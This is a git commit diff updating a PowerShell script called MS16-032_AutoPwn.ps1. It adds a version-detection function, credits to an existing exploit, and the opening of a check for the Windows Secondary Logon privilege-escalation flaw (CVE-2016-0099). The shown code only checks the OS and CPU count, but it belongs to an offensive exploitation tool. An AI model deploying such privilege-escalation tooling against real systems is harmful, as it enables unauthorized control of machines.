66142d47dc45458b74a745d08cc747eef193292d
illwill <illwill@illmob.org>
2017-04-10 00:13:05 -0400

    Update MS16-032_AutoPwn.ps1

--- MS16-032_AutoPwn.ps1
+++ MS16-032_AutoPwn.ps1
@@ -1,4 +1,24 @@
+<#
+    File: EscalateMe.ps1
+    Author: @xillwillx
+    License: GNU General Public License v3.0
+#> 
+
+function Get-OSVersion {
+$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+}
+
+#######################################################################################################################################
+# CVE-2016-0099 / MS16-032 - Secondary Logon Elevation of Privilege Vulnerability
+# Based on the work of @FuzzySec & @tiraniddo
+# https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+# https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
+# Windows 7 SP1 / Windows Server 2008 & R2 SP1 / Windows 8 & 8.1 / Windows Server 2012 & R2 / Windows 10 - Pre-Anniversary Build 14393
+#######################################################################################################################################
+
 function MS16-032{
+	Get-OSVersion
 	echo "[?] Checking for CVE-2016-0099 / MS16-032 - Secondary Logon PrivEsc Vuln"
 	if (!($([System.Environment]::ProcessorCount) -eq 1)){"[+] CPU core count=$([System.Environment]::ProcessorCount)";
 	switch ($OSMajorMinor)
